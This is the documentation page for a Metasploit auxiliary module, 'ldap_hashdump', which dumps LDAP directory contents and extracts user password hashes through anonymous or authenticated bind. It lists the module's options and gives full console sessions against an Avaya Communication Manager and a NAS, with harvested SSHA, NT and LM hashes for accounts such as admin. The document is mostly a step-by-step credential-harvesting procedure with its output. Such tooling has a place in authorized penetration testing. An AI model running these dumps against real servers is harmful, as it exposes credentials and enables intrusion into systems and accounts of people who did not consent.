## Vulnerable Application

### Description

This module uses an LDAP connection to dump data from LDAP server
using an annonymous or authenticated bind.
Searching for specific attributes it collects user credentials.

### Setup

Tested in the wild. No setup notes available at this time, as setup will
be specific to target environment.

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Actions

### Dump

Dump all LDAP data from the LDAP server.

## Options

### BASE_DN

If you already have the LDAP base DN, you may set it in this option.

### USER_ATTR

LDAP attribute to take the user name from. Defaults to DN, however you may
wish to change it UID, name or similar.

### PASS_ATTR

LDAP attribute to take the password hash from. Defaults to userPassword,
some LDAP server may use different attribute, e.g. unixUserPassword,
sambantpassword, sambalmpassword.

## Scenarios

### Avaya Communication Manager via anonymous bind

```
msf5 > use auxiliary/gather/ldap_hashdump
msf5 auxiliary(gather/ldap_hashdump) > options

Module options (auxiliary/gather/ldap_hashdump):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BASE_DN                     no        LDAP base DN if you already have it
   PASS_ATTR  userPassword     yes       LDAP attribute, that contains password hashes
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      389              yes       The target port
   SSL        false            no        Enable SSL on the LDAP connection
   USER_ATTR  dn               no        LDAP attribute, that contains username


Auxiliary action:

   Name  Description
   ----  -----------
   Dump  Dump all LDAP data


msf5 auxiliary(gather/ldap_hashdump) > set RHOSTS [redacted_ip_address]
RHOSTS => [redacted_ip_address]

msf5 auxiliary(gather/ldap_hashdump) > run
[*] Running module against [redacted_ip_address]

[*] Discovering base DN automatically
[*] Searching root DSE for base DN
[+] Discovered base DN: dc=vsp
[*] Dumping LDAP data from server at [redacted_ip_address]:389
[*] Storing LDAP data in loot
[+] Saved LDAP data to /home/hynek/.msf4/loot/20200726121633_default_[redacted_ip_address]_LDAPInformation_716210.txt
[*] Searching for attribute: userPassword
[*] Taking dn attribute as username
[+] Credentials found: uid=cust,ou=People,dc=vsp:{SSHA}AZKja92fbuuB9SpRlHqaoXxbTc43Mzc2MDM1Ng==
[+] Credentials found: uid=admin,ou=People,dc=vsp:{SSHA}AZKja92fbuuB9SpRlHqaoXxbTc43Mzc2MDM1Ng==
[*] Auxiliary module execution completed
msf5 auxiliary(gather/ldap_hashdump) > set USER_ATTR uid
USER_ATTR => uid
msf5 auxiliary(gather/ldap_hashdump) > run
[*] Running module against [redacted_ip_address]

[*] Discovering base DN automatically
[*] Searching root DSE for base DN
[+] Discovered base DN: dc=vsp
[*] Dumping LDAP data from server at [redacted_ip_address]:389
[*] Storing LDAP data in loot
[+] Saved LDAP data to /home/hynek/.msf4/loot/20200726121718_default_[redacted_ip_address]_LDAPInformation_712562.txt
[*] Searching for attribute: userPassword
[*] Taking uid attribute as username
[+] Credentials found: cust:{SSHA}AZKja92fbuuB9SpRlHqaoXxbTc43Mzc2MDM1Ng==
[+] Credentials found: admin:{SSHA}AZKja92fbuuB9SpRlHqaoXxbTc43Mzc2MDM1Ng==
[*] Auxiliary module execution completed
msf5 auxiliary(gather/ldap_hashdump) >
```

### NASDeluxe - NAS with Samba LM/NTLM hashes

```
msf5 auxiliary(gather/ldap_hashdump) > set USER_ATTR uid
USER_ATTR => uid
msf5 auxiliary(gather/ldap_hashdump) > set PASS_ATTR sambantpassword
PASS_ATTR => sambantpassword
msf5 auxiliary(gather/ldap_hashdump) > set RHOSTS [redacted_ip_address]
RHOSTS => [redacted_ip_address]

msf5 auxiliary(gather/ldap_hashdump) > run
[*] Running module against [redacted_ip_address]

[*] Discovering base DN automatically
[*] Searching root DSE for base DN
[+] Discovered base DN: dc=server,dc=nas
[*] Dumping LDAP data from server at [redacted_ip_address]:389
[*] Storing LDAP data in loot
[+] Saved LDAP data to /home/hynek/.msf4/loot/20200726201006_default_[redacted_ip_address]_LDAPInformation_026574.txt
[*] Searching for attribute: sambantpassword
[*] Taking uid attribute as username
[+] Credentials found: admin:209C6174DA490CAEB422F3FA5A7AE634
[+] Credentials found: joe:58E8C758A4E67F34EF9C40944EB5535B
[*] Auxiliary module execution completed

msf5 auxiliary(gather/ldap_hashdump) > run
[*] Running module against [redacted_ip_address]

[*] Discovering base DN automatically
[*] Searching root DSE for base DN
[+] Discovered base DN: dc=server,dc=nas
[*] Dumping LDAP data from server at [redacted_ip_address]:389
[*] Storing LDAP data in loot
[+] Saved LDAP data to /home/hynek/.msf4/loot/20200726201731_default_[redacted_ip_address]_LDAPInformation_427417.txt
[*] Searching for attribute: sambalmpassword
[*] Taking uid attribute as username
[+] Credentials found: admin:F0D412BD764FFE81AAD3B435B51404EE
[+] Credentials found: joe:3417BE166A79DDE2AAD3B435B51404EE
[*] Auxiliary module execution completed
```
